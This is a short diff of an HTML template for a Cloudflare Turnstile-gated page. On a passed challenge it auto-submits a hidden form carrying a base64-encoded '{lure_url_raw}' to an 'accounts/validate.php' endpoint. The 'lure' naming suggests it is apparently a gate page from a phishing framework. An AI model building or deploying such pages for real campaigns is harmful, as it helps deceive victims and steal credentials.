@@ -5,8 +5,7 @@
 </head>
 <body>
 
-<form action="https://$DOMAIN/accounts/validate.php" method="POST">
-<input type="hidden" name="id">
+<form action="https://{domain}/accounts/validate.php" method="POST">
 <input type="hidden" name="url">
 <div class="cf-turnstile" id ="turnstile-widget"></div>
 </form>
@@ -14,10 +13,9 @@
 <script>
 turnstile.ready(function () {
     params = new URLSearchParams(location.search);
-    document.querySelector("input[name=id]").value = location.search.slice(1);
-    document.querySelector("input[name=url]").value = "{lure_url_enc}";
+    document.querySelector("input[name=url]").value = btoa("{lure_url_raw}");
     turnstile.render('#turnstile-widget', {
-        sitekey: '$PKEY',
+        sitekey: '{pubkey}',
         appearance: 'interaction-only',
         callback: function(token) {
 	    document.forms[0].submit();
